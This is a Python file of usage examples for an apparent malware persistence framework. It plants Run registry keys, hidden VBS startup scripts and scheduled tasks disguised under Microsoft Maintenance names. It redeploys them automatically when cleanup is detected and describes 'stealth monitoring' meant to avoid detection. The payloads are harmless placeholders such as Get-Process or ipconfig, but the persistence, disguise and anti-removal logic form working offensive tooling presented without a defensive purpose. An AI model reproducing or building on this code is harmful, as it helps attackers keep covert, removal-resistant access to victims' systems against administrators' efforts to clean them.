#!/usr/bin/env python3
"""
Self-Healing Persistence - Usage Examples

Demonstrates various use cases and configurations for the self-healing
persistence system with auto-recovery capabilities.
"""

import time
import json
from self_healing_persistence import (
    SelfHealingPersistence,
    SelfHealingPersistenceBuilder,
    RecoveryTrigger,
    RecoveryStrategy,
    HealthStatus,
    create_basic_self_healing,
    create_redundant_self_healing
)


def example_1_basic_monitoring():
    """
    Example 1: Basic Self-Healing Persistence

    Demonstrates simple setup with automatic health monitoring
    and recovery of a single persistence point.
    """
    print("\n" + "="*70)
    print("EXAMPLE 1: Basic Self-Healing Persistence")
    print("="*70)

    # Create system with 5-minute check interval
    system = SelfHealingPersistence(
        check_interval_seconds=300,
        enable_stealth_monitoring=True
    )

    # Register a persistence point
    point_id = system.register_persistence_point(
        point_type="startup_file",
        location="/usr/local/bin/update.sh",
        payload="#!/bin/bash\necho 'System maintained'",
        metadata={"priority": "high", "owner": "admin"}
    )

    print(f"\n✓ Registered persistence point: {point_id}")
    print(f"  Type: startup_file")
    print(f"  Location: /usr/local/bin/update.sh")
    print(f"  Payload hash: {system.persistence_points[point_id].payload_hash[:16]}...")

    # Get current status
    status = system.get_health_status()
    print(f"\nHealth Status:")
    print(f"  Total points: {status['total_points']}")
    print(f"  Overall status: {status['overall_status']}")


def example_2_multi_point_redundancy():
    """
    Example 2: Multi-Point Redundancy with Fallback

    Demonstrates registering multiple persistence points with
    automatic redundancy across different methods.
    """
    print("\n" + "="*70)
    print("EXAMPLE 2: Multi-Point Redundancy with Fallback")
    print("="*70)

    builder = SelfHealingPersistenceBuilder()

    # Add registry persistence point
    builder.add_registry_point(
        registry_path="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name="SystemUpdate",
        payload="cmd.exe /c powershell -NoProfile -Command 'Get-Process'",
        metadata={"method": "registry", "priority": "high"}
    )

    # Add startup file persistence point
    builder.add_startup_file(
        file_path="C:\\Users\\Public\\AppData\\Roaming\\Startup\\maintenance.vbs",
        payload="On Error Resume Next\nSet objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd.exe /c ipconfig\", 0, False",
        metadata={"method": "startup", "format": "vbs"}
    )

    # Add scheduled task persistence point
    builder.add_scheduled_task(
        task_name="\\Microsoft\\Windows\\Maintenance\\SystemCheck",
        payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Get-ChildItem C:\\'",
        metadata={"method": "scheduled_task", "triggers": ["logon", "startup"]}
    )

    # Configure recovery parameters
    builder.set_check_interval(300)
    builder.set_recovery_timeout(60)
    builder.set_max_recovery_attempts(5)
    builder.enable_stealth_mode(True)

    system = builder.build()

    print(f"\n✓ Created redundant persistence system")
    print(f"  Total persistence points: {len(system.persistence_points)}")
    print(f"  Check interval: {system.check_interval}s")
    print(f"  Max recovery attempts: {system.max_recovery_attempts}")
    print(f"  Stealth mode: {'Enabled' if system.stealth_mode else 'Disabled'}")

    # Display all registered points
    points = system.get_persistence_points_status()
    for i, point in enumerate(points, 1):
        print(f"\n  Point {i}: {point['point_id']}")
        print(f"    Type: {point['type']}")
        print(f"    Location: {point['location']}")
        print(f"    Health: {'Healthy' if point['is_healthy'] else 'Degraded'}")


def example_3_recovery_strategies():
    """
    Example 3: Demonstrating Different Recovery Strategies

    Shows how different recovery strategies are selected based on
    recovery attempts and failure types.
    """
    print("\n" + "="*70)
    print("EXAMPLE 3: Recovery Strategies")
    print("="*70)

    system = SelfHealingPersistence(
        check_interval_seconds=60,
        max_recovery_attempts=5,
        enable_stealth_monitoring=True
    )

    # Register a test point
    point_id = system.register_persistence_point(
        point_type="registry",
        location="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TestApp",
        payload="powershell.exe -Command 'Write-Host Alive'"
    )

    print(f"\n✓ Registered test persistence point: {point_id}")

    # Demonstrate strategy selection logic
    strategies = {
        0: ("First recovery", "IMMEDIATE_REDEPLOY"),
        1: ("Second recovery", "IMMEDIATE_REDEPLOY"),
        2: ("Third recovery", "DELAYED_REDEPLOY"),
        3: ("Fourth recovery", "DELAYED_REDEPLOY"),
        4: ("Fifth recovery", "MULTI_POINT_DEPLOYMENT"),
    }

    print("\nRecovery Strategy Selection (by attempt number):")
    for attempt, (desc, strategy) in strategies.items():
        recovery_count = attempt
        system.point_recovery_counts[point_id] = recovery_count

        point = system.persistence_points[point_id]
        selected = system._select_recovery_strategy(
            RecoveryTrigger.REGISTRY_MISSING,
            point
        )

        print(f"  {desc:<20} → {selected.value}")


def example_4_health_monitoring():
    """
    Example 4: Comprehensive Health Monitoring

    Demonstrates performing health checks and monitoring system status
    over time.
    """
    print("\n" + "="*70)
    print("EXAMPLE 4: Comprehensive Health Monitoring")
    print("="*70)

    system = SelfHealingPersistence(
        check_interval_seconds=30,
        enable_stealth_monitoring=True
    )

    # Register multiple points
    points = []
    for i in range(3):
        pid = system.register_persistence_point(
            point_type=f"method_{i}",
            location=f"location_{i}",
            payload=f"payload_{i}",
            metadata={"index": i}
        )
        points.append(pid)

    print(f"\n✓ Registered {len(points)} persistence points for monitoring")

    # Simulate health checks
    print("\nPerforming health checks...")

    # Manually trigger health checks (instead of background monitoring)
    for check_num in range(1, 4):
        result = system.perform_health_check()

        print(f"\nHealth Check #{check_num}:")
        print(f"  Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(result.timestamp))}")
        print(f"  Total points: {result.total_points}")
        print(f"  Healthy: {result.healthy_points}")
        print(f"  Degraded: {result.degraded_points}")
        print(f"  Critical: {result.critical_points}")
        print(f"  Overall status: {result.overall_status.value}")
        print(f"  Points checked: {len(result.points_checked)}")

        time.sleep(0.1)  # Small delay between checks

    # Display health history
    print(f"\nHealth Check History: {len(system.health_check_history)} checks performed")


def example_5_recovery_events():
    """
    Example 5: Tracking Recovery Events

    Demonstrates recording and analyzing recovery events and their outcomes.
    """
    print("\n" + "="*70)
    print("EXAMPLE 5: Recovery Event Tracking")
    print("="*70)

    system = SelfHealingPersistence(
        enable_stealth_monitoring=True
    )

    # Register a persistence point
    point_id = system.register_persistence_point(
        point_type="startup_file",
        location="/tmp/persistence.sh",
        payload="#!/bin/bash\necho recovering..."
    )

    print(f"\n✓ Registered point for recovery testing: {point_id}")

    # Simulate multiple recovery attempts
    print("\nSimulating recovery attempts...")

    triggers = [
        RecoveryTrigger.REGISTRY_MISSING,
        RecoveryTrigger.STARTUP_FILE_MISSING,
        RecoveryTrigger.FAILURE_DETECTED,
        RecoveryTrigger.CLEANUP_ATTEMPT,
    ]

    for i, trigger in enumerate(triggers, 1):
        # Mock the recovery operation
        import unittest.mock as mock
        with mock.patch.object(system, '_immediate_redeploy', return_value=(i % 2 == 1)):
            success = system.initiate_recovery(
                point_id=point_id,
                trigger=trigger
            )

            print(f"\n  Recovery #{i}:")
            print(f"    Trigger: {trigger.value}")
            print(f"    Result: {'SUCCESS' if success else 'FAILED'}")

    # Display recovery history
    history = system.get_recovery_history()
    print(f"\nRecovery Event History: {len(history)} events")

    for i, event in enumerate(history, 1):
        print(f"\n  Event {i}:")
        print(f"    Point: {event['point_id']}")
        print(f"    Trigger: {event['trigger']}")
        print(f"    Strategy: {event['strategy']}")
        print(f"    Status: {'SUCCESS' if event['success'] else 'FAILED'}")
        print(f"    Recovery Time: {event['recovery_time_ms']:.2f}ms")


def example_6_checkpoint_and_recovery():
    """
    Example 6: Checkpoints for State Management

    Demonstrates creating and validating checkpoints for persistence
    state recovery.
    """
    print("\n" + "="*70)
    print("EXAMPLE 6: Checkpoints and State Recovery")
    print("="*70)

    system = SelfHealingPersistence(enable_stealth_monitoring=True)

    # Register multiple points
    for i in range(3):
        system.register_persistence_point(
            point_type=f"type_{i}",
            location=f"location_{i}",
            payload=f"payload_{i}"
        )

    print(f"\n✓ Registered {len(system.persistence_points)} persistence points")

    # Create a checkpoint
    print("\nCreating recovery checkpoint...")
    checkpoint = system.create_recovery_checkpoint()

    # Validate checkpoint
    is_valid = system.validate_checkpoint(checkpoint)
    print(f"✓ Checkpoint created and validated: {is_valid}")

    # Parse checkpoint data
    checkpoint_data = json.loads(checkpoint)
    print(f"\nCheckpoint Contents:")
    print(f"  Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(checkpoint_data['timestamp']))}")
    print(f"  Persistence points: {len(checkpoint_data['points'])}")
    print(f"  Recovery counts: {checkpoint_data['recovery_counts']}")
    print(f"  Events recorded: {checkpoint_data['events_count']}")


def example_7_stealth_monitoring():
    """
    Example 7: Stealth Monitoring Configuration

    Demonstrates stealth monitoring features that avoid detection.
    """
    print("\n" + "="*70)
    print("EXAMPLE 7: Stealth Monitoring")
    print("="*70)

    # Create system with stealth features enabled
    system = SelfHealingPersistence(
        check_interval_seconds=300,
        enable_stealth_monitoring=True
    )

    system.check_jitter = True
    system.obfuscated_checks = True

    print(f"\n✓ Created stealth-enabled monitoring system")
    print(f"  Base check interval: {system.check_interval}s")
    print(f"  Jitter enabled: {system.check_jitter}")
    print(f"  Obfuscated checks: {system.obfuscated_checks}")
    print(f"  Stealth mode: {system.stealth_mode}")

    # Register a point
    point_id = system.register_persistence_point(
        point_type="registry",
        location="HKCU\\Software\\Microsoft\\Windows\\Run\\SystemService",
        payload="cmd.exe /c tasklist"
    )

    print(f"\n✓ Registered stealth persistence point: {point_id}")

    print(f"\nStealth Features:")
    print(f"  • Check timing randomization (±30 seconds)")
    print(f"  • Obfuscated verification procedures")
    print(f"  • Minimal resource usage")
    print(f"  • No visible UI or error messages")
    print(f"  • Background operation via daemon threads")


def example_8_status_reporting():
    """
    Example 8: Comprehensive Status Reporting

    Demonstrates generating and analyzing detailed status reports.
    """
    print("\n" + "="*70)
    print("EXAMPLE 8: Comprehensive Status Reporting")
    print("="*70)

    system = SelfHealingPersistence(enable_stealth_monitoring=True)

    # Setup test scenario
    for i in range(2):
        system.register_persistence_point(
            point_type=f"method_{i}",
            location=f"location_{i}",
            payload=f"payload_{i}"
        )

    # Perform health check
    result = system.perform_health_check()

    # Get detailed status
    health_status = system.get_health_status()
    points_status = system.get_persistence_points_status()
    recovery_history = system.get_recovery_history()

    print(f"\n✓ Generated comprehensive status report")

    print(f"\nHealth Status Summary:")
    for key, value in health_status.items():
        if key not in ['issues_found']:
            print(f"  {key}: {value}")

    print(f"\nPersistence Points ({len(points_status)} total):")
    for point in points_status:
        print(f"  • {point['type']}: {point['location']}")
        print(f"    Health: {point['is_healthy']}, Verified: {point['verification_count']}x")

    # Export full report
    print(f"\nExporting full JSON report...")
    report_json = system.export_status_report()
    report = json.loads(report_json)

    print(f"  Report size: {len(report_json)} bytes")
    print(f"  Contains {len(report)} top-level sections")


def example_9_recovery_attempt_limits():
    """
    Example 9: Recovery Attempt Limits and Escalation

    Demonstrates how recovery escalates strategies when attempts are limited.
    """
    print("\n" + "="*70)
    print("EXAMPLE 9: Recovery Attempt Limits and Escalation")
    print("="*70)

    system = SelfHealingPersistence(
        max_recovery_attempts=5,
        enable_stealth_monitoring=True
    )

    point_id = system.register_persistence_point(
        point_type="registry",
        location="test",
        payload="payload"
    )

    print(f"\n✓ Registered point with max {system.max_recovery_attempts} recovery attempts")

    # Simulate recovery attempts exceeding limit
    print(f"\nAttempting recovery beyond limit:")

    import unittest.mock as mock

    for attempt in range(1, 8):
        with mock.patch.object(system, '_immediate_redeploy', return_value=True):
            success = system.initiate_recovery(
                point_id=point_id,
                trigger=RecoveryTrigger.FAILURE_DETECTED
            )

        status = "ALLOWED" if success else "BLOCKED (limit exceeded)"
        print(f"  Attempt {attempt}: {status}")


def example_10_multi_method_deployment():
    """
    Example 10: Multi-Method Deployment Strategy

    Demonstrates deploying persistence across multiple methods for
    maximum resilience.
    """
    print("\n" + "="*70)
    print("EXAMPLE 10: Multi-Method Deployment Strategy")
    print("="*70)

    # Use the helper function for redundant persistence
    system = create_redundant_self_healing(
        payload="powershell.exe -Command 'Get-Process'",
        registry_path="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        startup_file="C:\\Users\\Public\\Startup\\system.vbs",
        task_name="\\Microsoft\\Windows\\Maintenance\\Update"
    )

    print(f"\n✓ Created multi-method self-healing persistence")
    print(f"  Total methods: {len(system.persistence_points)}")
    print(f"  Check interval: {system.check_interval}s")
    print(f"  Recovery attempts: {system.max_recovery_attempts}")

    # Display deployment configuration
    points = system.get_persistence_points_status()
    print(f"\nDeployment Methods:")
    for i, point in enumerate(points, 1):
        print(f"  {i}. {point['type'].upper()}")
        print(f"     Location: {point['location']}")
        print(f"     Status: {'Healthy' if point['is_healthy'] else 'Degraded'}")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_basic_monitoring,
        example_2_multi_point_redundancy,
        example_3_recovery_strategies,
        example_4_health_monitoring,
        example_5_recovery_events,
        example_6_checkpoint_and_recovery,
        example_7_stealth_monitoring,
        example_8_status_reporting,
        example_9_recovery_attempt_limits,
        example_10_multi_method_deployment,
    ]

    print("\n" + "="*70)
    print("SELF-HEALING PERSISTENCE SYSTEM - COMPREHENSIVE EXAMPLES")
    print("="*70)

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\n⚠ Error in {example_func.__name__}: {str(e)}")

    print("\n" + "="*70)
    print("ALL EXAMPLES COMPLETED")
    print("="*70)


if __name__ == "__main__":
    run_all_examples()
